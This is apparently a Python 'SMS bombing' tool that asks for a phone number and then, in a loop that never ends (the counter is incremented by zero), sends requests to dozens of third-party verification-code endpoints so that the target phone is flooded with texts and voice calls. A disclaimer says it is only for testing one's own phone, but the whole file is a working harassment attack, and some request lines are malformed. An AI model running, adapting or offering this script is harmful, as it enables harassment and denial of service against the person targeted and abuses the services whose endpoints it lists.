# -*- coding:utf-8 -*-
import datetime
import time
import requests
import re
import os
import threading
import queue
# 导入urlopen
from urllib.request import urlopen
# 导入BeautifulSoup
from bs4 import BeautifulSoup as bf
# 导入urlretrieve函数，用于下载图片
from urllib.request import urlretrieve
# 获得当前时间
print ("\033[1;33;40m ")

now = datetime.datetime.now()
other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---root用户使用了信息轰炸\n')
Note.close()
print("____            _   _ _            _ _____ _  __")
print("|  _ \ ___ _ __ | |_(_) | ___      | |_   _| |/ /")
print("| |_) / _ \ '_ \| __| | |/ _ \  _  | | | | | ' /")
print("|  _ <  __/ |_) | |_| | |  __/ | |_| | | | | . \ ")
print("|_| \_\___| .__/ \__|_|_|\___|  \___/  |_| |_|\_\ ")
print("           |_|                                   ")
print("信息轰炸")
print("注意！注意！使用时请看这里！该工具仅限用于自己测压力！请勿恶意用于轰炸他人电话号码！金条k将不负任何法律责任！")
mc = input("请输入手机号: ")
now = datetime.datetime.now()
other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---输入的手机号为: %s \n'%(mc))
Note.close()
i=0
while i<10000000000:
      print("开始轰炸！请注意查收")
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=%s&_=1624877392029'%(mc))
      qq = requests.get('http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://w4j41.cn/v2/wxAccount/smsSend?mobile='+mc)
      qq = requests.get('http://atmyjr.com/user/ashx/ajax.ashx?action=telyuyin&mid=17433&v=1439377001052&txtMobile='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=sms'%(mc))
      qq = requests.get('http://mkxq.zymk.cn/user/v1/mobilevc/?callback=jQuery321016123103253181426_1503210785449&mobile=%s&service=mkn&_=1503210785451'%(mc))
      qq = requests.get('http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=%s&_=1624877392029'%(mc))
      qq = requests.get('http://atmyjr.com/user/ashx/ajax.ashx?action=telyuyin&mid=17433&v=1439377001052&txtMobile='+mc)
      qq = requests.get('http://tools.wx6.org/duanxinhongzhaji/?telcode='+mc)
      qq = requests.get('http://wx.yicaifeng.com/user/userService.jws?sendCaptchaByRegister&mobile=%s&origin=iwode&version=201901021710qh&openId=oNCvpjgBTqcOP1i-sPy-94nEvskQ&_=1624089834286'%(mc))
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum='+mc)
      qq = requests.get('http://w4j41.cn/v2/wxAccount/smsSend?mobile='+mc)
      qq = requests.get('http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=%s&type=25'%(mc))
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=ivr'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=sms'%(mc))
      qq = requests.get('http://www.a8zs.xyz//?sjh='+mc)
      qq = requests.get('http://c.boaov.org/boaoweb/lrsp/getyzmcode.do?xsid=&tel='+mc)
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://v.juhe.cn/sms/send?mobile=%s&tpl_id=11115&tpl_value'%(mc))
      qq = requests.get('http://www.365liye.com/API/Site/Member/SendCode?tel='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://tools.wx6.org/duanxinhongzhaji/?telcode='+mc)
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile='+mc)
      qq = requests.get('http://sapi.16888.com/app.php?mod=account&extra=mobileCode&mobile='+mc)
      qq = requests.get('http://ww38.api.duo17.com/sendsms.do?os_type=android&app_version=2.4.0.0&device_id=860903034476097&pnum='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=%s&_=1624877392029'%(mc))
      qq = requests.get('http://www.icar-life.com/api/Connect/get_sms_captcha?type=1&phone='+mc)
      qq = requests.get('http://vip.17s.cn/api/user/sendcode.html?username=%s&type=register&access-token='%(mc))
      qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=ivr'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=sms'%(mc))
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://hr.xfcbank.com/ajax/wap.php?action=get_authcode&mobile='+mc)
      qq = requests.get('http://c.boaov.org/boaoweb/lrsp/getyzmcode.do?xsid=&tel='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://v.juhe.cn/sms/send?mobile=%s&tpl_id=11115&tpl_value'%(mc))
      qq = requests.get('http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile='+mc)
      qq = requests.get('http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile='+mc)
      qq = requests.get('http://www.a8zs.xyz//?sjh='+mc)
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://www.icar-life.com/api/Connect/get_sms_captcha?type=1&phone='+mc)
      qq = requests.get('http://ww38.api.duo17.com/sendsms.do?os_type=android&app_version=2.4.0.0&device_id=860903034476097&pnum='+mc)
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://wx.yicaifeng.com/user/userService.jws?sendCaptchaByRegister&mobile=%s&origin=iwode&version=201901021710qh&openId=oNCvpjgBTqcOP1i-sPy-94nEvskQ&_=1624089834286'%(mc))
      qq = requests.get('http://mkxq.zymk.cn/user/v1/mobilevc/?callback=jQuery321016123103253181426_1503210785449&mobile=%s&service=mkn&_=1503210785451'%(mc))
      qq = requests.get('http://wx.yicaifeng.com/user/userService.jws?sendCaptchaByRegister&mobile=%s&origin=iwode&version=201901021710qh&openId=oNCvpjgBTqcOP1i-sPy-94nEvskQ&_=1624089834286'%(mc))
      qq = requests.get('http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum='+mc)
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://hr.xfcbank.com/ajax/wap.php?action=get_authcode&mobile='+mc)
      qq = requests.get('http://www.icar-life.com/api/Connect/get_sms_captcha?type=1&phone='+mc)
      qq = requests.get('http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum='+mc)
      qq = requests.get('http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=%s&type=25'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=%s&type=25'%(mc))
      qq = requests.get('http://www.a8zs.xyz//?sjh='+mc)
      qq = requests.get('http://www.a8zs.xyz//?sjh='+mc)
      qq = requests.get('http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=%s&type=25'%(mc))
      qq = requests.get('http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum='+mc)
      qq = requests.get('http://ww38.api.duo17.com/sendsms.do?os_type=android&app_version=2.4.0.0&device_id=860903034476097&pnum=')
      qq = requests.get('http://api.duo17.com/sendsms.do?os_type=android&app_version=2.4.0.0&device_id=860903034476097&pnum='+mc)
      qq = requests.get('http://hr.xfcbank.com/ajax/wap.php?action=get_authcode&mobile=')
      qq = requests.get('http://sapi.16888.com/app.php?mod=account&extra=mobileCode&mobile='+mc)
      qq = requests.get('http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile='+mc)
      qq = requests.get('http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile='+mc)
      qq = requests.get('http://v.juhe.cn/sms/send?mobile=%s&tpl_id=11115&tpl_value'%(mc))
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://www.sk-vip.cn/index.php?m=&c=page&a=yunhu&phone='+mc)
      qq = requests.get('http://tools.wx6.org/duanxinhongzhaji/?telcode='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://m.114-91.com/common/api?cmd=APPMemberGetCheckCode&mobile=%s&type=1&md5ParamNames=mobile%2Ctype'%(mc))
      qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
      qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=ivr'%(mc))
      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=sms'%(mc))
      qq = requests.get('http://sapi.16888.com/app.php?mod=account&extra=mobileCode&mobile='+mc)
      qq = requests.get('http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile='+mc)
      qq = requests.get('http://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?regTimeCode=1589627585503&phoneNumber='+mc)
      qq = requests.get('http://user.daojia.com/mobile/getcode?mobile='+mc)
      qq = requests.get('http://c.boaov.org/boaoweb/lrsp/getyzmcode.do?xsid=&tel='+mc)
      qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
      qq = requests.get('http://m.114-91.com/common/api?cmd=APPMemberGetCheckCode&mobile=%s&type=1&md5ParamNames=mobile%2Ctype'%(mc))
      qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
      print(qq.text)
i+=0

